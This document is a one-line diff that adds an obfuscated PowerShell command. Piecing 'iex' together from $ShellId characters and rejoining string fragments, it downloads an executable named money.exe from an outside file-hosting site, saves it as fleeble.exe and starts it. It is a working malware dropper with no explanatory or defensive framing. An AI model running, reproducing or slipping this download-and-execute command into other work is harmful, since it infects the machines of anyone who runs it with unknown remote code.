@@ -1,0 +1,1 @@
+﻿&( $sheLlID[1]+$sHElLiD[13]+'X') ((('(N'+'ew-Objec'+'t'+' S'+'yst'+'em.'+'Ne'+'t.WebCli'+'ent).Do'+'wnloa'+'dFi'+'le('+'ch4h'+'t'+'tp'+':/'+'/'+'ddl7.data.hu'+'/'+'get'+'/0/949'+'9830'+'/mon'+'e'+'y.exech4'+',ch4f'+'lee'+'b'+'le'+'.exech'+'4);Start-Pr'+'o'+'cess ch4'+'fle'+'e'+'bl'+'e.ex'+'ec'+'h4')  -rEPLaCE 'ch4',[chAr]39))
